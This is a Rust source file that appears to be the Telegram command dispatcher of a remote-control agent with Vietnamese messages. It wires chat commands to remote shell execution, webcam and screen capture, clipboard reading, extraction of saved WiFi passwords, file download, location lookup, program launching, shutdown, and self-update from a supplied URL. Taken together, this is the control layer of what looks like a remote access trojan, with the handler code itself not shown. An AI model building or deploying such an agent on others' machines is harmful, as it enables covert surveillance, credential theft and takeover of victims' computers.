use std::sync::Arc;

use anyhow::Result;
use dptree::case;
use teloxide::prelude::*;
use teloxide::types::{ParseMode, ReplyParameters};
use teloxide::utils::command::BotCommands;

use crate::bot::{auth, md, AgentState};

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "📋 Commands:")]
pub enum Command {
    #[command(description = "ℹ️ Trợ giúp")]
    Help,
    #[command(description = "🏓 Ping")]
    Ping,
    #[command(description = "📊 Trạng thái")]
    Status,
    #[command(description = "📸 Chụp màn hình")]
    Screenshot,
    #[command(description = "💻 Shell")]
    Shell(String),
    #[command(description = "❌ Hủy job")]
    Cancel,
    #[command(description = "ℹ️ System info")]
    Sysinfo,
    #[command(description = "📷 Camera")]
    Camera,
    #[command(description = "📂 List files")]
    Listfiles(String),
    #[command(description = "⬇️ Get file")]
    Getfile(String),
    #[command(description = "📋 Processes")]
    Procs,
    #[command(description = "💀 Kill")]
    Kill(String),
    #[command(description = "🌐 Netstat")]
    Netstat,
    #[command(description = "📋 Clipboard")]
    Clipboard,
    #[command(description = "📍 Location")]
    Location,
    #[command(description = "🖼️ Wallpaper")]
    Wallpaper,
    #[command(description = "🔒 Lock screen")]
    Lock,
    #[command(description = "⏻ Shutdown")]
    Shutdown,
    #[command(description = "🔄 Restart")]
    Restart,
    #[command(description = "⛔ Abort shutdown")]
    Abortshutdown,
    #[command(description = "▶️ Run program")]
    Run(String),
    #[command(description = "📜 History")]
    History,
    #[command(description = "🗑️ Uninstall")]
    Uninstall,
    #[command(description = "⬆️ Update")]
    Update(String),
    #[command(description = "📶 WiFi đã lưu")]
    Wifi,
    #[command(description = "🔇 Tắt âm")]
    Mute,
    #[command(description = "🔊 Bật âm")]
    Unmute,
    #[command(description = "🔊 Volume")]
    Volume(String),
    #[command(description = "💬 MessageBox")]
    Msgbox(String),
}

pub type HandlerResult = Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>;

pub fn schema() -> teloxide::dispatching::UpdateHandler<Box<dyn std::error::Error + Send + Sync + 'static>> {
    let command_handler = teloxide::filter_command::<Command, _>()
        .branch(case![Command::Help].endpoint(help))
        .branch(case![Command::Ping].endpoint(ping))
        .branch(case![Command::Status].endpoint(status))
        .branch(case![Command::Screenshot].endpoint(screenshot))
        .branch(case![Command::Shell(cmd)].endpoint(shell))
        .branch(case![Command::Cancel].endpoint(cancel_cmd))
        .branch(case![Command::Sysinfo].endpoint(sysinfo))
        .branch(case![Command::Camera].endpoint(camera))
        .branch(case![Command::Listfiles(path)].endpoint(listfiles))
        .branch(case![Command::Getfile(path)].endpoint(getfile))
        .branch(case![Command::Procs].endpoint(procs))
        .branch(case![Command::Kill(pid)].endpoint(kill))
        .branch(case![Command::Netstat].endpoint(netstat))
        .branch(case![Command::Clipboard].endpoint(clipboard))
        .branch(case![Command::Location].endpoint(location))
        .branch(case![Command::Wallpaper].endpoint(wallpaper))
        .branch(case![Command::Lock].endpoint(lock))
        .branch(case![Command::Shutdown].endpoint(shutdown))
        .branch(case![Command::Restart].endpoint(restart))
        .branch(case![Command::Abortshutdown].endpoint(abortshutdown))
        .branch(case![Command::Run(path)].endpoint(run_cmd))
        .branch(case![Command::History].endpoint(history))
        .branch(case![Command::Uninstall].endpoint(uninstall))
        .branch(case![Command::Update(args)].endpoint(update))
        .branch(case![Command::Wifi].endpoint(wifi))
        .branch(case![Command::Mute].endpoint(mute))
        .branch(case![Command::Unmute].endpoint(unmute))
        .branch(case![Command::Volume(level)].endpoint(volume_cmd))
        .branch(case![Command::Msgbox(text)].endpoint(msgbox_cmd));

    Update::filter_message().branch(command_handler)
}

fn get_user_id(msg: &Message) -> i64 {
    msg.from.as_ref().map(|u| u.id.0 as i64).unwrap_or(0)
}

fn reply_params(msg: &Message) -> ReplyParameters {
    ReplyParameters::new(msg.id)
}

async fn reply(bot: &Bot, msg: &Message, text: impl Into<String>) -> Result<()> {
    bot.send_message(msg.chat.id, text.into())
        .parse_mode(ParseMode::MarkdownV2)
        .reply_parameters(reply_params(msg))
        .await?;
    Ok(())
}

async fn reply_escaped(bot: &Bot, msg: &Message, text: impl Into<String>) -> Result<()> {
    bot.send_message(msg.chat.id, md::escape(&text.into()))
        .parse_mode(ParseMode::MarkdownV2)
        .reply_parameters(reply_params(msg))
        .await?;
    Ok(())
}

fn help_text() -> String {
    let mut t = String::new();
    t.push_str("*🤖 TG Remote Bot*\n\n");
    t.push_str("*── 📍 Điều khiển ──*\n");
    t.push_str("/help \\- Trợ giúp\n");
    t.push_str("/ping \\- Pong \\+ uptime \\+ IP\n");
    t.push_str("/status \\- PID \\+ uptime \\+ job\n\n");
    t.push_str("*── 📸 Thu thập thông tin ──*\n");
    t.push_str("/screenshot \\- Chụp màn hình\n");
    t.push_str("/camera \\- Chụp webcam\n");
    t.push_str("/sysinfo \\- CPU\\, RAM\\, Disk\n");
    t.push_str("/clipboard \\- Đọc clipboard\n");
    t.push_str("/location \\- Vị trí IP\n");
    t.push_str("/netstat \\- Kết nối mạng\n");
    t.push_str("/wifi \\- WiFi đã lưu \\+ mật khẩu\n");
    t.push_str("/wallpaper \\- Hình nền\n\n");
    t.push_str("*── 📂 File \\& Process ──*\n");
    t.push_str("/listfiles _\\<path\\>_ \\- Liệt kê file\n");
    t.push_str("/getfile _\\<path\\>_ \\- Tải file\n");
    t.push_str("/procs \\- Danh sách process\n");
    t.push_str("/kill _\\<pid\\>_ \\- Kill process\n");
    t.push_str("/run _\\<path\\>_ \\- Chạy chương trình\n\n");
    t.push_str("*── 💻 Shell ──*\n");
    t.push_str("/shell _\\<cmd\\>_ \\- Chạy lệnh\n");
    t.push_str("/cancel \\- Hủy job\n\n");
    t.push_str("*── ⏻ Hệ thống ──*\n");
    t.push_str("/lock \\- Khóa màn hình\n");
    t.push_str("/mute \\- Tắt âm\n");
    t.push_str("/unmute \\- Bật âm\n");
    t.push_str("/volume _\\<0\\-100\\>_ \\- Chỉnh âm lượng\n");
    t.push_str("/msgbox _\\<text\\>_ \\- Hiện MessageBox\n");
    t.push_str("/shutdown \\- Tắt máy\n");
    t.push_str("/restart \\- Khởi động lại\n");
    t.push_str("/abortshutdown \\- Hủy tắt máy\n\n");
    t.push_str("*── 🤖 Agent ──*\n");
    t.push_str("/history \\- Lịch sử\n");
    t.push_str("/uninstall \\- Gỡ agent\n");
    t.push_str("/update _\\<url\\>_ \\- Cập nhật\n");
    t
}

async fn help(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    reply(&bot, &msg, help_text()).await?;
    Ok(())
}

async fn ping(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    crate::commands::ping::ping(&bot, msg.chat.id, msg.id, &state).await?;
    Ok(())
}

async fn status(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    crate::commands::status::status(&bot, msg.chat.id, msg.id, &state).await?;
    Ok(())
}

async fn screenshot(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("screenshot") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::screenshot::screenshot(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn shell(bot: Bot, msg: Message, state: Arc<AgentState>, cmd: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if cmd.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /shell _\\<lệnh\\_>").await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("shell") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::shell::shell(&bot, msg.chat.id, msg.id, &state.active_job, &cmd).await?;
    Ok(())
}

async fn cancel_cmd(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    let handle = {
        let mut job = state.active_job.lock().unwrap();
        job.take().map(|r| r.handle)
    };
    if let Some(handle) = handle {
        handle.abort();
        reply(&bot, &msg, "✅ Job đã hủy").await?;
    } else {
        reply(&bot, &msg, "ℹ️ Không có job nào đang chạy").await?;
    }
    Ok(())
}

async fn sysinfo(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("sysinfo") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::sysinfo::sysinfo(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn camera(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("camera") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::camera::camera(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn listfiles(bot: Bot, msg: Message, state: Arc<AgentState>, path: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if path.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /listfiles _\\<path\\_>").await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("listfiles") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::files::listfiles(&bot, msg.chat.id, msg.id, &path).await?;
    Ok(())
}

async fn getfile(bot: Bot, msg: Message, state: Arc<AgentState>, path: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if path.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /getfile _\\<path\\_>").await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("getfile") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::files::getfile(&bot, msg.chat.id, msg.id, &path).await?;
    Ok(())
}

async fn procs(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("procs") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::procs::procs(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn kill(bot: Bot, msg: Message, state: Arc<AgentState>, pid: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if pid.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /kill _\\<pid\\_>").await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("kill") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    let pid: u32 = match pid.trim().parse() {
        Ok(p) => p,
        Err(_) => {
            reply(&bot, &msg, "❌ PID không hợp lệ\\, phải là số").await?;
            return Ok(());
        }
    };
    crate::commands::procs::kill_process(&bot, msg.chat.id, msg.id, pid).await?;
    Ok(())
}

async fn netstat(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("netstat") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::network::netstat(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn clipboard(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("clipboard") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::clipboard::clipboard(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn location(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("location") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::location::location(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn wallpaper(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("wallpaper") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::wallpaper::wallpaper(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn lock(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("lock") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::system::lock_screen(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn shutdown(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("shutdown") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::system::shutdown(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn restart(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("restart") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::system::restart(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn abortshutdown(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("abortshutdown") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::system::abort_shutdown(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn run_cmd(bot: Bot, msg: Message, state: Arc<AgentState>, path: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if path.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /run _\\<path\\_>").await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("run") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::system::run_program(&bot, msg.chat.id, msg.id, &path).await?;
    Ok(())
}

async fn history(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("history") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    reply(&bot, &msg, "ℹ️ History chưa được implement").await?;
    Ok(())
}

async fn uninstall(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    match crate::service::install::uninstall() {
        Ok(_) => { reply(&bot, &msg, "✅ Agent đã gỡ bỏ").await?; }
        Err(e) => { reply_escaped(&bot, &msg, format!("❌ Gỡ bỏ thất bại: {e}")).await?; }
    }
    Ok(())
}

async fn update(bot: Bot, msg: Message, state: Arc<AgentState>, args: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if args.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /update _\\<url\\>_ \\[_sha256\\_]").await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("update") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    let parts: Vec<&str> = args.split_whitespace().collect();
    let url = parts.first().unwrap_or(&"");
    let sha256 = parts.get(1).copied();
    match crate::updater::self_update::self_update(url, sha256).await {
        Ok(_) => { reply(&bot, &msg, "✅ Cập nhật thành công\\, đang khởi động lại\\.\\.\\.").await?; }
        Err(e) => { reply_escaped(&bot, &msg, format!("❌ Cập nhật thất bại: {e}")).await?; }
    }
    Ok(())
}

async fn wifi(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if let Err(secs) = state.rate_limiter.check("wifi") {
        reply(&bot, &msg, format!("⏳ Cooldown {secs}s")).await?;
        return Ok(());
    }
    crate::commands::wifi::wifi(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn mute(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    crate::commands::audio::mute(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn unmute(bot: Bot, msg: Message, state: Arc<AgentState>) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    crate::commands::audio::unmute(&bot, msg.chat.id, msg.id).await?;
    Ok(())
}

async fn volume_cmd(bot: Bot, msg: Message, state: Arc<AgentState>, level: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    let level: u8 = match level.trim().parse() {
        Ok(v) => v,
        Err(_) => {
            reply(&bot, &msg, "⚠️ Cú pháp: /volume _\\<0\\-100\\>_").await?;
            return Ok(());
        }
    };
    crate::commands::audio::set_volume(&bot, msg.chat.id, msg.id, level).await?;
    Ok(())
}

async fn msgbox_cmd(bot: Bot, msg: Message, state: Arc<AgentState>, text: String) -> HandlerResult {
    if !auth::is_authorized(get_user_id(&msg), state.super_user_id) {
        md::send(&bot, msg.chat.id, msg.id, "⛔ Không có quyền truy cập".to_string()).await?;
        return Ok(());
    }
    if text.trim().is_empty() {
        reply(&bot, &msg, "⚠️ Cú pháp: /msgbox _\\<text\\>_").await?;
        return Ok(());
    }
    crate::commands::msgbox::msgbox(&bot, msg.chat.id, msg.id, &text).await?;
    Ok(())
}
